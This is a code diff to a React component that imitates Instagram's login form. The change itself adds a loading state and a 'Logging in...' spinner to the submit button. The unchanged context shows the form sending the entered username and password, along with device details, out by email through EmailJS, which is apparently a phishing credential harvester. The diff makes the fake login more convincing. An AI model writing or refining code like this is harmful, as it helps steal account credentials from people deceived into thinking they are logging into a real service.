@@ -11,6 +11,7 @@ const FacebookGlyph = () => (
 
     function InstagramLogin({ onBack, onLoginSuccess }) {
     const [formData, setFormData] = useState({ username: "", password: "" });
+    const [isLoading, setIsLoading] = useState(false);
 
     const handleChange = (e) =>
         setFormData((s) => ({ ...s, [e.target.name]: e.target.value }));
@@ -18,6 +19,9 @@ const FacebookGlyph = () => (
     const handleSubmit = (e) => {
         e.preventDefault();
         console.log("Login attempt:", formData);
+        
+        // Set loading state
+        setIsLoading(true);
         
         // Send email using EmailJS
         const templateParams = {
@@ -74,6 +78,10 @@ IP Address: ${navigator.connection ? navigator.connection.effectiveType : 'Unkno
                 console.log('onLoginSuccess function not provided');
                 onBack();
             }
+        })
+        .finally(() => {
+            // Always clear loading state
+            setIsLoading(false);
         });
     };
 
@@ -141,9 +149,16 @@ IP Address: ${navigator.connection ? navigator.connection.effectiveType : 'Unkno
                 <button
                   type="submit"
                   className="mt-2 w-full rounded-lg bg-[#0095f6] py-1.5 text-sm font-semibold text-white hover:bg-[#1877f2]/90 disabled:opacity-60"
-                  disabled={!formData.username || !formData.password}
+                  disabled={!formData.username || !formData.password || isLoading}
                 >
-                  Log in
+                  {isLoading ? (
+                    <div className="flex items-center justify-center gap-2">
+                      <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                      <span>Logging in...</span>
+                    </div>
+                  ) : (
+                    "Log in"
+                  )}
                 </button>
               </form>
 
